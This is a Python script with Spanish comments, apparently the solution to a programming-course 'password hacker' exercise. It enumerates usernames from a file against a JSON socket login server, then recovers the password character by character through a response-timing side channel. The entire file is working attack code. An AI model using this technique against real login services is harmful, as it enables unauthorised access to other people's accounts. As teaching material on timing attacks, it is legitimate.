# importando las clases
import itertools  # iteradores
import json    # json
import socket  # sockets
import string  # string
import sys  # system
from datetime import datetime

# -------------------------------------------------------------------------------------
def create_json(user="", passw=" "):
    dict_user = {}
    dict_user["login"] = user
    dict_user["password"] = passw
    return json.dumps(dict_user, indent=4)

# -------------------------------------------------------------------------------------
def users_logins():  # se lee archivo de textio y se ubica el usuario requerido.
    with open('logins.txt', 'r') as file:
        for line in file:
            yield line.strip()


# -------------------------------------------------------------------------------------
def password_generator():  # generador de password
    # generando los password
    # for i in range(1, len(my_alphabet)):
    for i in range(1, 64):
        for password in itertools.combinations(my_alphabet, 1):
            yield ''.join(password)


# -------------------------------------------------------------------------------------

# variables
args = sys.argv

# ----- principal -----
if len(args) != 3:
    print('The script should be called with two arguments: IP address and port')
    exit(0)

ip = args[1]
port = int(args[2])
my_address = (ip, port)
my_alphabet = [char for char in (string.ascii_lowercase + string.digits + string.ascii_uppercase)]

start = datetime.now()
finish = datetime.now()
difference = finish - start
text_dif = []

with open('result_test.txt', 'w') as file:
    file.write('20200721\n')

with socket.socket() as my_socket:
    my_socket.connect(my_address)  # conexion socket
    my_user = users_logins()  # obtener usuario
    for user in my_user:
        user_pass = (create_json(user))   # creando json para ubicar usuario
        my_socket.send(bytes(user_pass, encoding='utf-8')) # enviar usuario
        response = json.loads(my_socket.recv(1024))  # recibir respuesta
        if response["result"] == "Wrong password!":  # se encontro el usuario, se buscara la contrasenia
            my_password = password_generator()  # generar password
            password_ = ""
            for password in my_password:
                password_ += password
                user_pass = (create_json(user, password_.strip()))
                start = datetime.now()
                my_socket.send(bytes(user_pass, encoding='utf-8')) # enviar usuario 2
                response = json.loads(my_socket.recv(1024))  # recibir respuesta 2
                finish = datetime.now()
                difference = (finish - start).total_seconds()
                text_dif.append(difference)
                with open('result_test.txt', 'a') as file:
                    file.write(response["result"] + ' Diferencia:' + str(difference) + '\n')
                    file.write(user_pass + '\n')
                    file.write(str(max(text_dif)) + '\n')

                if response["result"] == "Connection success!":
                    print(user_pass)
                    exit(0)
                # #elif response["result"] == "Wrong password!":
                else:
                     if difference >= 0.01:
                        password_ = password_
                     else:
                         password_ = password_[:-1]
